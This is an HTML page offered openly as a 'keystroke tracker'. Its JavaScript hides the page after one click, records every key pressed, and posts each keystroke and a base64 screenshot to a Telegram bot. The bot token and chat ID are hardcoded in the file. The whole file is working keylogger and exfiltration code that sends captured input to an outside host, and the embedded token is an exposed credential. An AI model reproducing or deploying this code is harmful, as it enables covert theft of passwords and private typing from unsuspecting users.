<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keystroke Tracker with Screenshot</title>
    <style>
        body {
            display: block; /* Page is visible initially */
        }
        #startLink {
            cursor: pointer;
            color: blue;
            text-decoration: underline;
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script> <!-- Include html2canvas library -->
    <script>
        const BOT_TOKEN = '7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo';  // Replace with your Telegram Bot Token
        const CHAT_ID = '6482794683';  // Replace with your Telegram chat ID

        // Function to send captured keystrokes to Telegram Bot
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent to Telegram:', data);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }

        // Function to capture keystrokes
        function captureKeystrokes() {
            let keystrokes = '';

            // Listen for keydown events to capture keystrokes
            document.addEventListener('keydown', (event) => {
                keystrokes += event.key; // Capture each key pressed
                sendToTelegram(`Captured Keystroke: ${event.key}`);  // Send keystroke to Telegram
            });

            // Capture when the page is focused again
            document.addEventListener('focus', () => {
                console.log("Page is focused. Resuming keystroke tracking.");
            });

            // Capture when the page loses focus (user switches tabs or minimizes)
            document.addEventListener('blur', () => {
                console.log("Page is blurred. Keystroke tracking continues in the background.");
            });
        }

        // Function to take a screenshot of the page
        function takeScreenshot() {
            html2canvas(document.body).then(function(canvas) {
                const screenshotDataUrl = canvas.toDataURL('image/png');
                
                // Send screenshot to Telegram
                sendToTelegram('Screenshot of the page:');
                sendToTelegram(screenshotDataUrl);  // Send the base64 image data to Telegram
                console.log('Screenshot taken and sent');
            });
        }

        // Function to hide page and start keystroke tracking and screenshot
        function startTracking() {
            // Hide the page immediately
            document.body.style.display = 'none';  
            
            captureKeystrokes();  // Start capturing keystrokes immediately
            takeScreenshot();     // Take a screenshot when the page starts working
        }

        // Event listener for the link click
        document.addEventListener("DOMContentLoaded", function() {
            const startLink = document.getElementById("startLink");

            // When the user clicks the link, hide the page and start tracking
            startLink.addEventListener("click", function() {
                startTracking();
            });
        });
    </script>
</head>
<body>
    <h1>Keystroke Tracker Running in Background</h1>
    <p>Click the link below to start the tracker:</p>
    <p id="startLink">Click here to start tracking keystrokes and take a screenshot!</p>
</body>
</html>
